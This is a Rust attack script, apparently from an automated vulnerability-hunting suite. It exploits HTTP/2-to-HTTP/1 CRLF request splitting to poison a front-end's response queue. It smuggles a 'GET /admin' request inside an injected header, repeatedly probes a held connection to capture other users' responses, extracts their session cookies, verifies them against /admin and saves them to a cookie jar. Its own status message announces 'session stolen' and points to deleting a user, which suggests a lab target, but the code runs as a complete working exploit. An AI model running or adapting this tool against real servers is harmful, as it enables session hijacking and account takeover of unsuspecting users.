#!/usr/bin/env rust-script
//! name: h2_rq_hunt
//! description: Bounded H2->H1 CRLF-split response-queue-poisoning hunter - arms the split on a fresh h2 connection, paces probes on that same held connection until the front-end recycles it, re-arms, and records every foreign response with a status histogram. Candidates come only from foreign responses that are NOT our own smuggled-/admin 401 leftover (the denied marker), so verification stays tiny and the sweep can run the full window; an admin-origin response (login 302 + Set-Cookie, or an admin page without the home marker) is verified inline against --verify-path and written as an http_session jar.
//! version: 1.0.0
//! args: <base-url> [--path /] [--probe-path /zz1] [--smuggle 'GET /admin HTTP/1.1'] [--seconds N] [--probes-per-conn N] [--idle-ms N] [--hold-ms N] [--read-ms N] [--gap-ms N] [--verify-path /admin] [--out JAR] [--selftest]
//! keywords: 漏洞猎手套件, hunter, h2, http2, crlf, injection, request-splitting, request-smuggling, response-queue-poisoning, session-theft, hpack, sustain
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const HOME_MARKER: &str = "Search the blog";
const DENIED_MARKER: &str = "only available if logged in as an administrator"; // binding-exempt: server response marker literal

struct Opts {
    host: String,
    port: u16,
    path: String,
    probe_path: String,
    smuggle: String,
    seconds: f64,
    probes_per_conn: u32,
    idle_ms: u64,
    hold_ms: u64,
    read_ms: u64,
    gap_ms: u64,
    verify_path: String,
    out: Option<String>,
}

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let v = inject_value("GET /admin HTTP/1.1", "lab.test");
        let c = cookie_value("session=abc123; Secure", "session").unwrap_or_default();
        let ok = v.starts_with("\r\n\r\n") && v.contains("GET /admin HTTP/1.1\r\nHost: lab.test") && c == "abc123";
        pi_rust_lib::report::success("h2_rq_hunt", json!({"selftest": if ok {"ok"} else {"fail"}}), "run against the base url")
            .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut o = Opts {
        host: String::new(),
        port: 443,
        path: "/".to_string(),
        probe_path: "/zz1".to_string(),
        smuggle: "GET /admin HTTP/1.1".to_string(),
        seconds: 180.0,
        probes_per_conn: 10,
        idle_ms: 0,
        hold_ms: 400,
        read_ms: 500,
        gap_ms: 60,
        verify_path: "/admin".to_string(),
        out: None,
    };
    let mut i = 0;
    while i < args.len() {
        let next = |i: usize| args.get(i + 1).cloned();
        match args[i].as_str() {
            "--path" => { if let Some(v) = next(i) { o.path = v; } i += 1; }
            "--probe-path" => { if let Some(v) = next(i) { o.probe_path = v; } i += 1; }
            "--idle-ms" => { o.idle_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.idle_ms); i += 1; }
            "--smuggle" => { if let Some(v) = next(i) { o.smuggle = v; } i += 1; }
            "--seconds" => { o.seconds = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.seconds); i += 1; }
            "--probes-per-conn" => { o.probes_per_conn = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.probes_per_conn); i += 1; }
            "--hold-ms" => { o.hold_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.hold_ms); i += 1; }
            "--read-ms" => { o.read_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.read_ms); i += 1; }
            "--gap-ms" => { o.gap_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.gap_ms); i += 1; }
            "--verify-path" => { if let Some(v) = next(i) { o.verify_path = v; } i += 1; }
            "--out" => { o.out = next(i); i += 1; }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("h2_rq_hunt", "missing base url", "call as: h2_rq_hunt <base-url> --seconds 180");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    o.host = parsed.host_str().unwrap_or("").to_string();
    o.port = parsed.port().unwrap_or(443);

    match run(&o).await {
        Ok(data) => {
            let next = if data["verified_session"].is_string() {
                "session stolen -> http_session with the written jar to reach /admin and delete carlos"
            } else {
                "no admin-origin response yet: rerun with a longer --seconds"
            };
            pi_rust_lib::report::success("h2_rq_hunt", data, next).unwrap_or(());
        }
        Err(e) => {
            pi_rust_lib::report::failure("h2_rq_hunt", &e, "check the base url / split payload shape");
            std::process::exit(1);
        }
    }
}

fn inject_value(smuggle: &str, host: &str) -> String {
    format!("\r\n\r\n{smuggle}\r\nHost: {host}\r\n")
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

async fn h2_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(tls)
}

async fn send_request(
    tls: &mut TlsStream<TcpStream>,
    sid: u32,
    host: &str,
    path: &str,
    inject: Option<&str>,
) -> Result<(), String> {
    let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"GET".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
    ];
    if let Some(v) = inject {
        headers.push((b"x-arm".to_vec(), v.as_bytes().to_vec()));
    }
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x5, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

async fn read_one(tls: &mut TlsStream<TcpStream>, dec: &mut hpack::Decoder<'_>, target: u32, read_ms: u64) -> Value {
    let mut status: Option<String> = None;
    let mut location: Option<String> = None;
    let mut cookies: Vec<String> = Vec::new();
    let mut body_len = 0usize;
    let mut sample = String::new();
    let mut ended = false;
    let idle = Duration::from_millis(read_ms.max(150));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 | 9 => {
                if let Ok(hs) = dec.decode(&payload) {
                    if sid == target {
                        for h in hs.iter() {
                            let n: &[u8] = &h.0;
                            let v: &[u8] = &h.1;
                            if n == b":status" {
                                status = Some(String::from_utf8_lossy(v).to_string());
                            } else if n.eq_ignore_ascii_case(b"set-cookie") {
                                cookies.push(String::from_utf8_lossy(v).to_string());
                            } else if n.eq_ignore_ascii_case(b"location") {
                                location = Some(String::from_utf8_lossy(v).to_string());
                            }
                        }
                    }
                }
                if sid == target && flags & 0x1 != 0 {
                    ended = true;
                }
            }
            0 => {
                if sid == target {
                    body_len += payload.len();
                    if sample.len() < 4000 {
                        sample.push_str(&String::from_utf8_lossy(&payload));
                    }
                    if flags & 0x1 != 0 {
                        ended = true;
                    }
                }
            }
            3 => {
                if sid == target {
                    ended = true;
                }
            }
            _ => {}
        }
        if ended {
            break;
        }
    }
    let foreign = status.as_deref() != Some("200") || !sample.contains(HOME_MARKER);
    json!({
        "status": status,
        "location": location,
        "len": body_len,
        "foreign": foreign,
        "denied": sample.contains(DENIED_MARKER),
        "set_cookie": cookies,
        "snippet": sample.chars().take(160).collect::<String>(),
    })
}

fn cookie_value(set_cookie: &str, name: &str) -> Option<String> {
    let needle = format!("{name}=");
    let idx = set_cookie.find(&needle)?;
    let mut out = String::new();
    for c in set_cookie[idx + needle.len()..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c);
        } else {
            break;
        }
    }
    if out.is_empty() { None } else { Some(out) }
}

fn head_window(page: &str, fwd: usize) -> String {
    let mut end = fwd.min(page.len());
    while end > 0 && !page.is_char_boundary(end) {
        end -= 1;
    }
    page[..end].to_string()
}

async fn http1_get(
    cfg: Arc<ClientConfig>,
    host: &str,
    port: u16,
    path: &str,
    cookie: Option<&str>,
) -> Result<(u16, String), String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    let mut req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    req.push_str("\r\n");
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(8), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let status = head
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    Ok((status, body))
}

async fn run(o: &Opts) -> Result<Value, String> {
    let h1 = tls_config(&[b"http/1.1"]);
    let h2 = tls_config(&[b"h2"]);
    let inject = inject_value(&o.smuggle, &o.host);
    let started = Instant::now();
    let deadline = started + Duration::from_secs_f64(o.seconds.max(5.0));

    let mut conns = 0u32;
    let mut probes = 0u32;
    let mut arms_ok = 0u32;
    let mut dead = 0u32;
    let mut hist: BTreeMap<String, u32> = BTreeMap::new();
    let mut probe_hist: BTreeMap<String, u32> = BTreeMap::new();
    let mut feed_rows: Vec<Value> = Vec::new();
    let mut feed_events = 0u32;
    let mut foreign_rows: Vec<Value> = Vec::new();
    let mut candidates: Vec<String> = Vec::new();
    let mut verified: Option<(String, u16, String)> = None;
    let mut last_err: Option<String> = None;
    let mut tested = 0u32;

    while Instant::now() < deadline && verified.is_none() {
        let mut tls = match h2_connect(h2.clone(), &o.host, o.port).await {
            Ok(t) => t,
            Err(e) => {
                last_err = Some(e);
                break;
            }
        };
        let mut dec = hpack::Decoder::new();
        let mut sid = 1u32;
        if send_request(&mut tls, sid, &o.host, &o.path, Some(&inject)).await.is_err() {
            last_err = Some("arm write failed".to_string());
            break;
        }
        let arm = read_one(&mut tls, &mut dec, sid, o.read_ms).await;
        if arm["status"].is_string() {
            arms_ok += 1;
        }
        conns += 1;
        sid += 2;
        for k in 0..o.probes_per_conn {
            if Instant::now() >= deadline || verified.is_some() {
                break;
            }
            let wait = if k == 0 { o.idle_ms } else { o.hold_ms };
            tokio::time::sleep(Duration::from_millis(wait)).await;
            if send_request(&mut tls, sid, &o.host, &o.probe_path, None).await.is_err() {
                dead += 1;
                break;
            }
            let row = read_one(&mut tls, &mut dec, sid, o.read_ms).await;
            probes += 1;
            sid += 2;
            if row["status"].is_null() {
                dead += 1;
                break;
            }
            let st = row["status"].as_str().unwrap_or("none").to_string();
            *probe_hist.entry(st.clone()).or_insert(0) += 1;
            let foreign = row["foreign"].as_bool().unwrap_or(false);
            let denied = row["denied"].as_bool().unwrap_or(false);
            if foreign {
                *hist.entry(st.clone()).or_insert(0) += 1;
                if foreign_rows.len() < 40 {
                    foreign_rows.push(row.clone());
                }
            }
            // Our probe path is a distinct 404: any other status means the queue was fed
            // by somebody else (the admin) - that is the signal the victim shares this
            // upstream. Escalate to rapid probing and bank any session cookie.
            if st != "404" {
                feed_events += 1;
                if feed_rows.len() < 40 {
                    feed_rows.push(row.clone());
                }
                if !denied {
                    for c in row["set_cookie"].as_array().cloned().unwrap_or_default() {
                        if let Some(v) = c.as_str().and_then(|s| cookie_value(s, "session")) {
                            if !candidates.iter().any(|x| *x == v) {
                                candidates.push(v.clone());
                                tested += 1;
                                if let Ok((vs, body)) =
                                    http1_get(h1.clone(), &o.host, o.port, &o.verify_path, Some(&format!("session={v}"))).await
                                {
                                    if vs == 200 && !body.contains(DENIED_MARKER) {
                                        verified = Some((v, vs, head_window(&body, 400)));
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        drop(tls);
        if Instant::now() < deadline {
            tokio::time::sleep(Duration::from_millis(o.gap_ms)).await;
        }
    }

    let mut jar: Option<String> = None;
    if let Some((v, _, _)) = &verified {
        if let Some(p) = &o.out {
            let _ = std::fs::write(p, json!({ o.host.clone(): { "session": v } }).to_string());
            jar = Some(p.clone());
        }
    }

    Ok(json!({
        "host": o.host,
        "inject": inject,
        "elapsed_s": (started.elapsed().as_secs_f64() * 10.0).round() / 10.0,
        "connections": conns,
        "probes": probes,
        "arms_ok": arms_ok,
        "dead_connections": dead,
        "foreign_status_hist": hist,
        "probe_status_hist": probe_hist,
        "feed_events": feed_events,
        "feed_rows": feed_rows,
        "foreign_rows": foreign_rows,
        "candidates": candidates.len(),
        "candidates_tested": tested,
        "verified_session": verified.as_ref().map(|(v, _, _)| v.clone()),
        "verified": verified.as_ref().map(|(v, st, snip)| json!({"session": v, "status": st, "snippet": snip})),
        "jar": jar,
        "last_error": last_err,
    }))
}
